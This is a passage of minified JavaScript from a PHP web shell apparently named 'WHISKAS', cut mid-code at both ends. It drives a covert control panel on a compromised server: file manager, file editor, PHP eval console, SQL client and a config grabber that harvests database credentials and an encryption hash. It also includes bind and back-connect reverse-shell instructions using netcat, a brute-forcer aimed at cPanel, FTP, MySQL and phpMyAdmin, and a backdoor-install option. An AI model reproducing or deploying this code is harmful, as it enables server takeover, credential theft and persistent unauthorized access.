a[fname='"+n+"']").parentElement.parentElement.parentElement.remove()}catch(e){}l+='<tr class="fmanager-row" id="tr_row_'+r+'"><td><div class="myCheckbox"><input type="checkbox" name="f[]" value="'+n+'" class="chkbx"id="checkbox'+r+'"><label for="checkbox'+r+'"></label></div></td><td id="td_row_'+r+'">'+p+'<div style="position:relative;display:inline-block;bottom:12px;"><arow="'+r+'" id="id_'+r+'" class="main_name" onclick="editor(\''+s+"','auto','','','','file');\" href=\"#action=fileman&amp;path="+c_+"&amp;file="+s+'" fname="'+n+'" ftype="file" path="'+c_+'" opt_title="">'+n+'</a></div></td><td><span style="font-weight:unset;" class="main_size">'+c+'</span></td><td><span style="font-weight:unset;" class="main_modify">'+_+'</span></td><td><span style="font-weight:unset;" class="main_owner_group">'+u+'</span></td><td><a id="id_chmode_'+r+'" href="javascript:void(0)" onclick="editor(\''+s+"','chmod','','','','file')\">"+f+'</a></td><td><a id="id_rename_'+r+'" title="Rename" class="actions" href="javascript:void(0);" onclick="editor(\''+s+"', 'rename','','','','file')\">R</a> <a id=\"id_touch_"+r+'" title="Modify Datetime" class="actions" href="javascript:void(0);" onclick="editor(\''+s+"', 'touch','','','','file')\">T</a> <a id=\"id_edit_"+r+'" class="actions" title="Edit" href="javascript:void(0);" onclick="editor(\''+s+"', 'edit','','','','file')\">E</a> <a id=\"id_download_"+r+'" title="Download" class="actions" href="javascript:void(0);" onclick="g(\'FilesTools\',null,\''+n+"', 'download')\">D</a><a id=\"id_delete_"+r+'" title="Delete" class="actions" href="javascript:void(0);" onclick="var chk = confirm(\'Are You Sure For Delete # '+s+" # ?'); chk ? g('FilesMan',null,'delete', '"+s+"') : '';\"> X </a></td></tr>"}d.querySelector("#"+o+" #filemanager_last_tr").insertAdjacentHTML("beforebegin",l),WHISKASShowNotification("File(s) uploaded successfully","Uploader"),WHISKASFmngrContextRow()}else WHISKASShowNotification("Folder has no permission...","Uploader","error");WHISKASCheckCurrentFilesManTab(i)}},a.open("POST",d.URL),a.send(l)}}function WHISKASCheckCurrentFilesManTab(e){-1==$("filesman_tab_"+e).classList.value.indexOf("filesman-tab-active")&&$("filesman_tab_"+e).classList.add("tab-is-done")}function g(a,c,WHISKAS1,WHISKAS2,WHISKAS3,WHISKAS4,WHISKAS5,WHISKAS6,WHISKAS7,WHISKAS8,WHISKAS9,WHISKAS10,charset){var fm_id=0==WHISKAS_fm_id?WHISKAS_current_fm_id:WHISKAS_fm_id,fm_id2=WHISKAS_fm_id,fm_path=null==c||0==c.length?c_:c,d_mf_c=fm_path,g_action_id=WHISKAS_before_do_action_id;0==WHISKAS_fm_id&&(set(a,c,WHISKAS1,WHISKAS2,WHISKAS3,WHISKAS4,WHISKAS5,WHISKAS6,WHISKAS7,WHISKAS8,WHISKAS9,WHISKAS10,charset),d_mf_c=d.mf.c.value),"GetConfig"!=a&&"download"!=WHISKAS2&&islinux&&"/"!=d_mf_c.substr(0,1)&&(d_mf_c="/"+d_mf_c),"FilesMan"==a?(WHISKASloader("filesman_holder_"+fm_id,"block"),g_action_id="filesman_holder_"+fm_id):""!=g_action_id?WHISKASloader(g_action_id,"block"):"FilesTools"!=a&&"download"!=WHISKAS2&&"GetConfig"!=a&&("sql"==a?(showEditor("database_window"),g_action_id=loadPopUpDatabase("")):"FilesMan"!=a&&(showEditor("options_window"),g_action_id=loadPopUpOpTions(a)),WHISKASloader(g_action_id,"block"));for(var data="a="+WHISKASb64(a)+"&c="+WHISKASb64(d_mf_c)+"&",i=1;i<=10;i++)data+="WHISKAS"+i+"="+WHISKASb64(eval("d.mf.WHISKAS"+i+".value"))+"&";if("FilesMan"==a){var pagenum=d.querySelector("#"+g_action_id+" .page-number.active-page-number");null!=pagenum&&(data+="pagenum="+WHISKASb64(getCookie(g_action_id+"_page_number")),setCookie(g_action_id+"_page_number",1,2012))}if(data+="&ajax="+WHISKASb64("true"),"FilesTools"==a&&"download"==WHISKAS2){WHISKASLoaderOnTop("none");var dl=$("dlForm");return dl.a.value=WHISKASb64("dlfile"),dl.c.value=WHISKASb64(d_mf_c),dl.file.value=WHISKASb64(WHISKAS1),void dl.submit()}"GetConfig"!=a?(_Ajax(d.URL,data,function(e,t){evalJS(e);var i=!1;if(WHISKASLoaderOnTop("none"),"sql"==a)return console.log(t),loadPopUpDatabase(e,t),!1;if("FilesMan"==a){WHISKASloader("filesman_holder_"+fm_id,"none"),d.querySelector("#filesman_holder_"+fm_id).innerHTML=e,fm_path=fm_path.replace(/\/\//g,"/"),$("filesman_tab_"+fm_id).setAttribute("path",fm_path);var l=WHISKASGetLastFolderName(fm_path);d.querySelector("#filesman_tab_"+fm_id+" span").innerHTML=l,WHISKASFmngrContextRow(),"function"==typeof WHISKAS1&&WHISKAS1(e),WHISKASCheckCurrentFilesManTab(fm_id)}else(options_window_is_minimized||"."==t.substr(0,1))&&"."==t.substr(0,1)&&(i=!0,t=t.substr(1),showEditor("options_window")),i||WHISKASloader(t,"none"),loadPopUpOpTions(t,e),"phpeval"==a&&WHISKASLoadAceEditor("PhpCode"),"coldumper"==a.substr(0,9)&&WHISKASColDumperInit()},!1,""==g_action_id?"."+a:g_action_id),g_action_id="",0==fm_id2&&c!=c_&&c&&initDir(c)):(WHISKASloader(WHISKAS3,"block"),_Ajax(d.URL,data,function(e,a){var t=a;a=d.querySelector("#"+("id_db"!=a.substr(0,5)?"option_"+a:a));try{(e=JSON.parse(e)).host&&e.user&&e.dbname&&($("db_host")&&(a.querySelector("#db_host").value=e.host),$("db_user")&&(a.querySelector("#db_user").value=e.user),$("db_name")&&(a.querySelector("#db_name").value=e.dbname),$("db_pw")&&(a.querySelector("#db_pw").value=e.password),$("db_prefix")&&e.prefix&&(a.querySelector("#db_prefix").value=e.prefix),$("cc_encryption_hash")&&e.cc_encryption_hash&&(a.querySelector("#cc_encryption_hash").value=e.cc_encryption_hash))}catch(e){}WHISKASloader(t,"none")},!1,WHISKAS3))}function WHISKASGetLastFolderName(e){var a=e.replace(/\/\//g,"/").split("/");for(var t in a)0==a[t].length&&a.splice(t,1);var i=a[a.length-1];return 0==i.length&&(i="/"),i}function WHISKASloader(e,a){if(0==e.length)return!1;try{var t=$("loader_"+e);if(null==t&&"block"==a){var i=null;"editor"==e?i=d.querySelector("#editor .editor-modal"):"id_db"==e.substr(0,5)?i=$(e):"terminal_id"==e.substr(0,11)?i=$(e):"editor"==e.substr(0,6)?i=$(e):"cgiframe"==e?i=$("cgiframe"):"filesman_holder"==e.substr(0,15)?(i=$(e)).style.minHeight="300px":i=$("option_"+e),i.insertAdjacentHTML("afterbegin","<div id='loader_"+e+'\' class="options-loader-holder"><div parent="'+e+'" onclick="WHISKASAjaxController(this);" class="stopAjax">[ Stop it ]</div><div class="WHISKASteam-loader-text">WHISKAS Zone</div><div class="WHISKAS-ajax-error"></div><img src=\'https://storage.dk-only.site/shell-assest/dk-profile.png\'></div>')}else"filesman_holder"==e.substr(0,15)&&($(e).style.minHeight="0"),null!=t&&(t.style.display=a)}catch(e){}}function fs(e){var a=e.getAttribute("db_id"),t=d.querySelector("#"+a+" div.sf");mysql_cache.hasOwnProperty(a)||(mysql_cache[a]={}),WHISKASloader(a,"block");var i=t.querySelector("input[name=sql_host]").value,l=t.querySelector("input[name=sql_login]").value,o=t.querySelector("input[name=sql_pass]").value,r=t.querySelector("input[name=sql_base]")?t.querySelector("input[name=sql_base]").value:t.querySelector("select[name=sql_base]").value,n=t.querySelector("select[name=type]").value,s=t.querySelector("input[name=sql_count]").checked?"true":"";_Ajax(d.URL,"a="+WHISKASb64("Sql")+"&WHISKAS1="+WHISKASb64("query")+"&WHISKAS2=&c="+WHISKASb64(c_)+"&charset="+WHISKASb64("UTF-8")+"&type="+WHISKASb64(n)+"&sql_host="+WHISKASb64(i)+"&sql_login="+WHISKASb64(l)+"&sql_pass="+WHISKASb64(o)+"&sql_base="+WHISKASb64(r)+"&sql_count="+WHISKASb64(s)+"&current_mysql_id="+WHISKASb64(a)+"&ajax="+WHISKASb64("true"),function(e,a){loadPopUpDatabase(e,a),evalJS(e),WHISKASloader(a,"none")},!1,a)}function ctlbc(e){var a=$("bcStatus"),t=$("bcipAction");"bind"==e.value?(t.style.display="none",a.innerHTML="<small>Press ` <font color='red'>>></font> ` button and run ` <font color='red'>nc server_ip port</font> ` on your computer</small>"):(t.style.display="inline-block",a.innerHTML="<small>Run ` <font color='red'>nc -l -v -p port</font> ` on your computer and press ` <font color='red'>>></font> ` button</small>")}function $(e){return d.getElementById(e)}function addnewup(){var e="footerup_"+upcount,a="pfooterup_"+upcount,t=1!=upcount?"pfooterup_"+(upcount-1):"pfooterup",i=d.createElement("p");i.innerHTML='<labelclass="inputfile" for="'+e+'"><span id="__fnameup'+upcount+'"></span> <strong>&nbsp;&nbsp;&#128193; Choose a file</strong></label><input id="'+e+'" type="file" name="f[]" onChange="handleup(this,'+upcount+');" multiple>',i.id=a,i.appendAfter($(t)),upcount++}function WHISKAS_searcher_tool(e){switch(e){case"all":case"dirs":_WHISKASSet(!0,"Disabled");break;case"files":_WHISKASSet(!1,"php")}}function _WHISKASSet(e,a){d.srch.ext.disabled=e,d.srch.ext.value=a}function dis_input(e){switch(e){case"phpmyadmin":bruteSet(!0,"Disabled","http://");break;case"direct":bruteSet(!1,"2222","http://");break;case"cp":bruteSet(!1,"2082","http://");break;case"ftp":bruteSet(!0,"Disabled","ftp://");break;case"mysql":bruteSet(!1,"3306","http://");break;case"ftpc":bruteSet(!1,"21","http://")}}function bruteSet(e,a,t){c="21"!=a?"localhost":"ftp.example.com",$("port").disabled=e,$("port").value=a,$("target").value=c,$("protocol").value=t}function inBackdoor(e){"my"==e.value?$("backdoor_textarea").style.display="block":$("backdoor_textarea").style.display="none"}function saveByKey(e){return!("s"==String.fromCharCode(e.which).toLowerCase()&&e.ctrlKey||19==e.which)||($("editor_edit_area").onsubmit(),e.preventDefault(),!1)}function WHISKASAjaxError(e,a,t,i){if(void 0!==a){var l=d.querySelector("#loader_"+a);null!=l&&(firewall="",403==e&&(firewall=" ~ FireWall Detected!"),l.querySelector("img").remove(),l.querySelector(".WHISKAS-ajax-error").innerHTML=e+" ( "+t+firewall+" )",WHISKASShowNotification(t,"Ajax","error"))}}function WHISKASInitCwdContext(){d.querySelectorAll(".header_pwd").forEach(function(e){e.addEventListener("contextmenu",function(e){var a=e.target.getAttribute("path"),t=d.querySelector("#rightclick_menu >a[name=newtab]");t.setAttribute("href","javascript:void(0);"),t.removeAttribute("target"),t.onclick=function(){WHISKASFilesManNewTab(a,"/")};var i=e.clientX,l=e.clientY;WHISKASSortMenuItems(["newtab"]),WHISKASRightClickMenu(i,l),e.preventDefault()})})}function WHISKASRightClickMenu(e,a){rightclick_menu_context.top=a+"px",rightclick_menu_context.left=e+"px",rightclick_menu_context.visibility="visible",rightclick_menu_context.opacity="1"}function WHISKASSortMenuItems(e){var a=["newtab","link","download","view","edit","move","copy","rename","modify","permission","compress","extract","delete","view_archive"],t=!1;for(var i in a){for(var l in t=!1,e)a[i]!=e[l]||(d.querySelector("#rightclick_menu > a[name="+a[i]+"]").style.display="block",t=!0);t||(d.querySelector("#rightclick_menu > a[name="+a[i]+"]").style.display="none")}}function WHISKASAceChangeSetting(e,a){var t=e.options[e.selectedIndex].value,i=e.getAttribute("base"),l=WHISKAS_ace_editors.editor;"eval"==i&&(l=WHISKAS_ace_editors.eval);var o=e.getAttribute("ace_id");"lang"==a?l[o].session.setMode("ace/mode/"+t):"theme"==a&&l[o].setTheme("ace/theme/"+t),setCookie("WHISKAS_ace_"+a+"_"+i,t,2012)}function WHISKASAceChangeWrapMode(e,a){var t=WHISKAS_ace_editors.editor;"eval"==a&&(t=WHISKAS_ace_editors.eval);var i=e.getAttribute("ace_id");e.checked?t[i].session.setUseWrapMode(!0):t[i].session.setUseWrapMode(!1)}function WHISKASAceChangeFontSize(e,a,t){var i=WHISKAS_ace_editors.editor;"eval"==e&&(i=WHISKAS_ace_editors.eval);var l=t.getAttribute("ace_id"),o=i[l].getFontSize();"+"==a?++o:--o,i[l].setFontSize(o),setCookie("WHISKAS_ace_fontsize_"+e,o,2012)}function setCookie(e,a,t){var i=new Date;i.setTime(i.getTime()+24*t*60*60*1e3);var l="expires="+i.toUTCString();document.cookie=e+"="+a+";"+l+";path=/"}function getCookie(e){var a=("; "+document.cookie).split("; "+e+"=");if(2==a.length)return a.pop().split(";").shift()}function editorClose(e){if(d.body.style.overflow="visible",elem=$(e),elem.setAttribute("class","editor-anim-close"),"editor"==e){if(is_minimized=!1,null!=WHISKAS_ace_editors.editor&&null!=WHISKAS_ace_editors.editor){for(var a in WHISKAS_ace_editors.editor)WHISKAS_ace_editors.editor[a].destroy();WHISKAS_ace_editors.editor=null,d.querySelector(".editor-tabs").innerHTML="",d.querySelector(".editor-content-holder").innerHTML=""}}else if("cgiloader"==e)php_temrinal_using_cgi&&(d.querySelector(".terminal-tabs").innerHTML="",d.querySelector(".terminal-contents").innerHTML=""),php_temrinal_using_cgi=!1,cgi_is_minimized=!1;else if("options_window"==e){if(options_window_is_minimized=!1,null!=WHISKAS_ace_editors.eval){for(var a in WHISKAS_ace_editors.eval)WHISKAS_ace_editors.eval[a].destroy();WHISKAS_ace_editors.eval=null,d.querySelectorAll(".php-evals").forEach(function(e){e.removeAttribute("ace")})}}else"database_window"==e&&(database_window_is_minimized=!1);setTimeout(function(){elem=$(e),elem.removeAttribute("class"),elem.style.display="none","options_window"==e&&(elem.querySelector(".options_tab").innerHTML="",elem.querySelector(".options_content").innerHTML="")},1e3),d.body.style.overflow="visible"}function popupWindowBackPosition(){var e={cgiloader:cgi_is_minimized,options_window:options_window_is_minimized,database_window:database_window_is_minimized,editor:is_minimized},a=[];for(var t in e)e[t]&&a.push(t);1==a.length?$(a[0]+"-minimized").style.top="30%":2==a.length?($(a[0]+"-minimized").style.top="20%",$(a[1]+"-minimized").style.top="50%"):3==a.length?($(a[0]+"-minimized").style.top="0%",$(a[1]+"-minimized").style.top="30%",$(a[2]+"-minimized").style.top="60%"):4==a.length&&($(a[0]+"-minimized").style.top="0%",$(a[1]+"-minimized").style.top="30%",$(a[2]+"-minimized").style.top="55%",$(a[3]+"-minimized").style.top="80%")}function showEditor(e){if($(e).setAttribute("class","editor-anim-show"),$(e+"-minimized").setAttribute("class","minimized-hide"),"editor"==e)is_minimized=!1;else if("cgiloader"==e)cgi_is_minimized=!1;else if("options_window"==e){options_window_is_minimized=!1;var a=d.querySelector("#options_window .content_options_holder .options_tab .tab_name.tab_is_active.tab-is-done");null!=a&&a.classList.remove("tab-is-done")}else"database_window"==e&&(database_window_is_minimized=!1);popupWindowBackPosition(),d.body.style.overflow="hidden"}function editorMinimize(e){$(e).setAttribute("class","editor-anim-minimize"),$(e+"-minimized").setAttribute("class","minimized-show"),"editor"==e?is_minimized=!0:"cgiloader"==e?cgi_is_minimized=!0:"options_window"==e?options_window_is_minimized=!0:"database_window"==e&&(database_window_is_minimized=!0),popupWindowBackPosition(),d.body.style.overflow="visible"}function clearEditorHistory(){if(confirm("Are u Sure?"))for(var e in editor_files)e!=editor_current_file&&removeHistory(e)}function isArchive(e){var a,t=[".tar.gz",".tar.bz2",".tar.z",".tar.xz",".zip",".zipx",".7z",".bz2",".gz",".rar",".tar",".tgz"];for(a in t)if(new RegExp("(.*)("+t[a].replace(/\./g,"\\.")+")$","gi").test(e))return!0;return!1}function editor(e,a,t,i,l,o){if("dir"==o&&".."==e)return!1;if("download"==a)return g("FilesTools",i,e,"download"),!1;var r="",n="",s="",c="",f=d.mf.c.value,_=!0;if(e=e.trim(),0==Object.keys(editor_files).length){var u=getCookie("WHISKAS_history_files");try{for(var p in u=atob(u),editor_files=JSON.parse(u))insertToHistory(p,editor_files[p].file,0,editor_files[p].type)}catch(e){}}if("phar://"==e.substr(0,7))f=c_;else if(-1!=e.indexOf("/")){var m=e.split("/");e=m[m.length-1],delete m[m.length-1],f=m.join("/"),islinux&&(f="/"+f)}if(void 0===o&&(o=""),void 0!==i&&null!=i&&0!=i.length&&(f=i.trim()),"auto"==a&&isArchive(e))return WHISKASSyncMenuToOpt(e,!0),!1;try{for(var v in editor_files)if(editor_files[v].file==decodeURIComponent(e)&&editor_files[v].pwd.replace(/\//g,"")==f.replace(/\//g,"")){_=!1,l=v;break}}catch(e){}if(editor_error=!0,void 0!==t&&0!=t.length&&null!=t&&(r=WHISKASb64(t)),void 0!==l&&null!=l&&0!=l.length)n=WHISKASb64(l),s=l,c=l.replace("file_","");else{var h="file_"+(c=getRandom(10));n=WHISKASb64(h),s=h}var b="editor_source_"+c;if(null==$(b)){try{d.querySelector(".editor-contents.editor-content-active").classList.remove("editor-content-active")}catch(e){}try{d.querySelector(".editor-tabs .editor-tab-name.editor-tab-active").classList.remove("editor-tab-active")}catch(e){}d.querySelector(".editor-tabs").insertAdjacentHTML("beforeend","<div onclick='editorTabController(this);' opt_id='"+b+"' id='tab_"+b+"' class='editor-tab-name editor-tab-active'>"+decodeURIComponent(e)+" <span opt_id='"+b+"' onclick='closeEditorContent(this,event);return false;' title='[close]' style='cursor:pointer;color:#ff4444;font-weight:bold;font-size:14px;margin-left:5px;'>X</span></div>"),d.querySelector(".editor-content-holder").insertAdjacentHTML("afterbegin","<div class='editor-contents editor-content-active' id='"+b+"'></div>")}return 0==is_minimized&&"none"==$("editor").style.display?($("editor").style.display="block",showEditor("editor"),WHISKASloader(b,"block")):(is_minimized&&showEditor("editor"),null!=$(b)?WHISKASloader(b,"block"):(WHISKASloader("editor","block"),b="editor")),_Ajax(d.URL,"a="+WHISKASb64("FilesTools")+"&c="+WHISKASb64(f)+"&WHISKAS1="+WHISKASb64(e)+"&WHISKAS2="+WHISKASb64(a)+"&WHISKAS3="+r+"&WHISKAS4="+n+"&WHISKAS5=&WHISKAS6=&WHISKAS7=&WHISKAS8=&WHISKAS9=&WHISKAS10=&&ajax="+WHISKASb64("true"),function(t,i){var l=$("tab_"+i);try{null!=l&&((-1==l.classList.value.indexOf("editor-tab-active")||is_minimized)&&(l.classList.add("tab-is-done"),WHISKASShowNotification("proccess is done...","Editor: "+l.innerText)),is_minimized&&WHISKASUpdateOptionsBadge("editor"))}catch(t){}if("none"==$("editor").style.display?WHISKASLoaderOnTop("none"):WHISKASloader(i,"none"),r.length>0&&"edit"==a)return is_minimized||null!=l&&-1!=l.classList.value.indexOf("editor-tab-active")&&WHISKASShowNotification("saved...!","Editor"),!1;if(null!=$(i)&&($(i).innerHTML=t),is_minimized&&WHISKASShowNotification("proccess is done...","Editor: "+decodeURIComponent(e)),$("editor").style.display="block",evalJS(t),WHISKASLoadAceEditor("view_ml_content"),"delete"!=a&&editor_error){var c=d.getElementsByClassName("is_active");0!=c.length&&(c[0].className="file-holder"),n=s,e=decodeURIComponent(e),!editor_files[n]&&_?(editor_files[n]={file:e,pwd:f,type:o},insertToHistory(n,e," is_active",o),"mkfile"==a&&g("FilesMan",null)):$(n).parentNode.className+=" is_active"}d.body.style.overflow="hidden",d.getElementsByClassName("filestools")[0].setAttribute("fid",n),editor_files[n]&&(d.getElementsByClassName("editor-path")[0].innerHTML=(editor_files[n].pwd+"/"+editor_files[n].file).replace(/\/\//g,"/")),editor_current_file=n,updateCookieEditor()},!1,b),!1}function WHISKASLoadAceEditor(e,a){return!1;if(void 0===a&&(a=!1),null==$("WHISKAS-ace-plugin")){var t=document.createElement("script");return t.src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.4.11/ace.js",t.id="WHISKAS-ace-plugin",t.onload=function(){WHISKASLoadAceEditor(e,a)},d.body.appendChild(t),!1}try{"allow"==$(e).getAttribute("mode")&&(a=!1)}catch(e){}if("view_ml_content"==e){null==WHISKAS_ace_editors.editor&&(WHISKAS_ace_editors.editor={});var i=getCookie("WHISKAS_ace_theme_editor"),l=getCookie("WHISKAS_ace_fontsize_editor");void 0===i&&(i="gruvbox"),0==i.length&&(i="terminal"),d.querySelectorAll(".editor-ace-controller").forEach(function(e){if(null!=e.getAttribute("ace"))return!1;e.setAttribute("ace","ok");var t=getRandom(10),o=e.querySelector(".view_ml_content");o.setAttribute("id","view_ml_content-"+t),WHISKAS_ace_editors.editor["view_ml_content-"+t]=ace.edit(o),WHISKAS_ace_editors.editor["view_ml_content-"+t].setReadOnly(a),WHISKAS_ace_editors.editor["view_ml_content-"+t].setShowPrintMargin(!1),WHISKAS_ace_editors.editor["view_ml_content-"+t].setTheme("ace/theme/"+i),WHISKAS_ace_editors.editor["view_ml_content-"+t].session.setMode("ace/mode/php"),WHISKAS_ace_editors.editor["view_ml_content-"+t].session.setUseWrapMode(!0),WHISKAS_ace_editors.editor["view_ml_content-"+t].commands.addCommand({name:"save",bindKey:{win:"Ctrl-S",mac:"Cmd-S"},exec:function(e){d.querySelector("#ace-save-btn-"+t).click()}}),e.querySelector("select.ace-theme-selector").value=i,e.querySelectorAll(".ace-controler").forEach(function(e){e.setAttribute("ace_id","view_ml_content-"+t),-1!=e.classList.value.indexOf("ace-save-btn")&&e.setAttribute("id","ace-save-btn-"+t)}),void 0!==l&&setTimeout(function(){WHISKAS_ace_editors.editor["view_ml_content-"+t].setFontSize(parseInt(l))},1e3)})}else{null==WHISKAS_ace_editors.eval&&(WHISKAS_ace_editors.eval={});i=getCookie("WHISKAS_ace_theme_eval"),l=getCookie("WHISKAS_ace_fontsize_eval");void 0===i&&(i="terminal"),0==i.length&&(i="terminal"),d.querySelectorAll(".php-evals").forEach(function(e){if(null!=e.getAttribute("ace"))return!1;e.setAttribute("ace","ok");var t=e.querySelector(".php-evals-ace"),o=getRandom(10);t.setAttribute("id","phpeval-"+o),WHISKAS_ace_editors.eval["phpeval-"+o]=ace.edit(t),WHISKAS_ace_editors.eval["phpeval-"+o].setReadOnly(a),WHISKAS_ace_editors.eval["phpeval-"+o].setShowPrintMargin(!1),WHISKAS_ace_editors.eval["phpeval-"+o].setTheme("ace/theme/"+i),WHISKAS_ace_editors.eval["phpeval-"+o].session.setMode("ace/mode/php"),WHISKAS_ace_editors.eval["phpeval-"+o].session.setUseWrapMode(!0),e.querySelector("select.ace-theme-selector").value=i,e.querySelectorAll(".ace-controler").forEach(function(e){e.setAttribute("ace_id","phpeval-"+o)}),void 0!==l&&setTimeout(function(){WHISKAS_ace_editors.eval["phpeval-"+o].setFontSize(parseInt(l))},1e3)})}}function insertToHistory(e,a,t,i){var l="";t&&0!=t&&(l=t);var o=document.createElement("div");o.innerHTML="<div id='"+e+"' class='history' onClick='reopen(this);'><div class='editor-icon'>"+loadType(a,i,e)+"</div><div class='editor-file-name'>"+a+"</div></div><div class='history-close' onClick='removeHistory(\""+e+"\");'>X</div>",o.className="file-holder"+l,o.addEventListener("mouseover",function(){setEditorTitle(e,"over"),this.childNodes[1].style.opacity="1"}),o.addEventListener("mouseout",function(){setEditorTitle(e,"out"),this.childNodes[1].style.opacity="0"});var r=d.getElementsByClassName("history-list")[0];r.insertBefore(o,r.firstChild)}function loadType(e,a,t){"none"==a&&_Ajax(d.URL,"a="+WHISKASb64("checkfiletype")+"&path="+WHISKASb64(editor_files[t].pwd)+"&arg="+WHISKASb64(editor_files[t].file),function(e){$(t).innerHTML="<div class='editor-icon'>"+loadType(editor_files[t].file,e,t)+"</div><div class='editor-file-name'>"+editor_files[t].file+"</div>",editor_files[t].type=e});if("file"==a){a=(a=e.split("."))[a.length-1].toLowerCase();-1==["json","ppt","pptx","xls","xlsx","msi","config","cgi","pm","c","cpp","cs","java","aspx","asp","db","ttf","eot","woff","woff2","woff","conf","log","apk","cab","bz2","tgz","dmg","izo","jar","7z","iso","rar","bat","sh","WHISKAS","gz","tar","php","php4","php5","phtml","html","xhtml","shtml","htm","zip","png","jpg","jpeg","gif","bmp","ico","txt","js","rb","py","xml","css","sql","htaccess","pl","ini","dll","exe","mp3","mp4","m4a","mov","flv","swf","mkv","avi","wmv","mpg","mpeg","dat","pdf","3gp","doc","docx","docm"].indexOf(a)&&(a="notfound")}else a="folder";return'<img src="http://solevisible.com/icons/{type}" width="30" height="30">'.replace("{type}",a+".png")}function updateFileEditor(e,a){var t="id_"+e,i="id_chmode_"+e,l="id_rename_"+e,o="id_touch_"+e,r="id_edit_"+e,n="id_download_"+e,d="id_delete_"+e,s=$(t).getAttribute("ftype");"folder"==s&&(s="dir"),"file"==s?($(t).innerHTML=a,$(t).setAttribute("href","#action=fileman&path="+c_+"/"+a),$(t).setAttribute("onclick","editor('"+a+"','auto','','','','file')"),$(r).setAttribute("onclick","editor('"+a+"','edit','','','','"+s+"')"),$(n).setAttribute("onclick","g('FilesTools',null,'"+a+"', 'download')")):($(t).innerHTML="<b>| "+a+" |</b>",$(t).setAttribute("onclick","g('FilesMan', '"+c_+"/"+a+"')")),$(i).setAttribute("onclick","editor('"+a+"','chmod','','','','"+s+"')"),$(l).setAttribute("onclick","editor('"+a+"','rename','','','','"+s+"')"),$(o).setAttribute("onclick","editor('"+a+"','touch','','','','"+s+"')"),$(d).setAttribute("onclick","var chk = confirm('Are You Sure For Delete # "+a+" # ?'); chk ? g('FilesMan',null,'delete', '"+a+"') : '';"),$(t).setAttribute("fname",a)}function updateDirsEditor(e,a){var t=d.mf.c.value+"/",i=editor_files[e].pwd+"/"+a+"/",l=editor_files[e].pwd+"/"+editor_files[e].file+"/";for(var o in i=i.replace(/\/\//g,"/"),l=l.replace(/\/\//g,"/"),-1!=(t=t.replace(/\/\//g,"/")).search(i)&&(initDir(t.replace(i,l)),d.mf.c.value=t.replace(i,l)),editor_files){var r=editor_files[o].pwd+"/";-1!=(r=r.replace(/\/\//g,"/")).search(i)&&(editor_files[o].pwd=r.replace(i,l))}updateCookieEditor()}function updateCookieEditor(){setCookie("WHISKAS_history_files",btoa(JSON.stringify(editor_files)),2012)}function setEditorTitle(e,a){if("out"==a&&""!=editor_current_file){var t=d.querySelector(".editor-tab-name.editor-tab-active");e=null!=t?t.getAttribute("opt_id").replace("editor_source_","file_"):editor_current_file}editor_files[e]&&(d.getElementsByClassName("editor-path")[0].innerHTML=(editor_files[e].pwd+"/"+editor_files[e].file).replace(/\/\//g,"/"))}function removeHistory(e){delete editor_files[e],$(e)&&$(e).parentNode.parentNode.removeChild($(e).parentNode);var a=d.getElementsByClassName("filestools")[0];a&&a.getAttribute("fid")==e&&(a.outerHTML=""),editor_current_file==e&&(editor_current_file=""),updateCookieEditor()}function getRandom(e){for(var a="",t="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",i=void 0===e?20:e;i>0;--i)a+=t[Math.floor(Math.random()*t.length)];return a}function reopen(e){var a=e.getAttribute("id"),t=editor_files[a].pwd,i=editor_files[a].file,l="editor_source_"+a.replace("file_","");null==$(l)?editor(i,"auto","",t,a):editorTabController(l,!0)}function copyToClipboard(e){e=e.getAttribute("ace_id");var a=WHISKAS_ace_editors.editor[e].selection.toJSON();WHISKAS_ace_editors.editor[e].selectAll(),WHISKAS_ace_editors.editor[e].focus(),document.execCommand("copy"),WHISKAS_ace_editors.editor[e].selection.fromJSON(a),WHISKASShowNotification("text copied","Editor")}function encrypt(e,a){if(null==a||a.length<=0)return null;e=WHISKASb64(e,!0),a=WHISKASb64(a,!0);for(var t="",i="",l=0;l<e.length;)for(var o=0;o<a.length&&(t=e.charCodeAt(l)^a.charCodeAt(o),i+=String.fromCharCode(t),!(++l>=e.length));o++);return WHISKASb64(i,!0)}function reloadSetting(e){return WHISKASloader(WHISKAS_before_do_action_id,"block"),_Ajax(d.URL,"a="+WHISKASb64("settings")+"&WHISKAS1="+WHISKASb64(e.protect.value)+"&WHISKAS2="+WHISKASb64(e.lgpage.value)+"&WHISKAS3="+WHISKASb64(e.username.value)+"&WHISKAS4="+WHISKASb64(e.password.value)+"&WHISKAS5="+WHISKASb64(">>")+"&WHISKAS6="+WHISKASb64(e.icon.value)+"&WHISKAS7="+WHISKASb64(e.post_encrypt.value)+"&WHISKAS8="+WHISKASb64("main")+"&WHISKAS9="+WHISKASb64(e.cgi_api.value)+"&c="+WHISKASb64(c_)+"&ajax="+WHISKASb64("true"),function(e,a){loadPopUpOpTions(a,e),evalJS(e),WHISKASloader(a,"none")},!1,WHISKAS_before_do_action_id),WHISKAS_before_do_action_id="",0==e.e.value&&1==e.protect.value&&setTimeout("location.reload()",1e3),e.s.value!=e.icon.value&&setTimeout("location.reload()",1e3),!1}function reloadColors(e){var a={};void 0===e?d.querySelectorAll(".colors_input").forEach(function(e){var t=e.getAttribute("target").replace(".","");a[t]=e.value}):a=e;var t=$("use_default_color").checked?"1":"0";_Ajax(d.URL,"a="+WHISKASb64("settings")+"&WHISKAS1="+WHISKASb64(JSON.stringify(a))+"&WHISKAS2="+WHISKASb64(">>")+"&WHISKAS3="+WHISKASb64(t)+"&WHISKAS8="+WHISKASb64("color")+"&c="+WHISKASb64(c_)+"&ajax="+WHISKASb64("true"),function(e){evalJS(e)},!0)}function WHISKASb64(e,a){return void 0!==a||0==post_encryption_mode?window.btoa(unescape(encodeURIComponent(e))):encrypt(e,"<?php echo __WHISKAS_SECRET_KEY__; ?>")}function evalCss(e){var a=document.createElement("style");a.styleSheet?a.styleSheet.cssText=e:a.appendChild(document.createTextNode(e)),d.getElementsByTagName("head")[0].appendChild(a)}function colorHandlerKey(e){setTimeout(function(a){colorHandler(e)},200)}function colorHandler(e){var a=e.getAttribute("target"),t=e.getAttribute("multi"),l=a.indexOf(":hover");if(t){var o=JSON.parse(atob(t)),r="";for(i in 